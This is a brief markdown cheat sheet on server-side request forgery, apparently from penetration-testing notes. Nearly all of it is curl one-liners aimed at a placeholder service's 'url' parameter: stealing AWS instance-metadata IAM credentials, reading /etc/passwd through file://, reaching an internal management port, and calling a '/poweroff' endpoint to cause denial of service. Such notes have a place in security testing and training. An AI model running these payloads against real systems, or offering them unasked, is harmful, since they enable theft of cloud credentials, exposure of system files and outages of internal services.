# SSRF

## Table of Contents

- [Access Control Bypass](#access-control-bypass)
- [Denial of Service](#denial-of-service)

## Access Control Bypass

### Access controls implemented in the service can be bypassed, leading to data leakage.

- Retrieve security credentials from instance metadata [^1]
    ```bash
    curl https://[VULNERABLE-SERVICE]/translate?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
    ```

- Read arbitrary files from the file system
    ```bash
    curl https://[VULNERABLE-SERVICE]/translate?url=file:///etc/passwd
    ```

- Access to the internal network
    ```bash
    curl https://[VULNERABLE-SERVICE]/translate?url=http://127.0.0.1:8888/management
    ```

## Denial of Service

### It is possible to interact with internal services, causing service interruptions.

- Calling a management endpoint of an internal service
    ```bash
    curl https://[VULNERABLE-SERVICE]/translate?url=http://127.0.0.1:8888/poweroff
    ```

[^1]: Based on IMDSv1 (AWS)
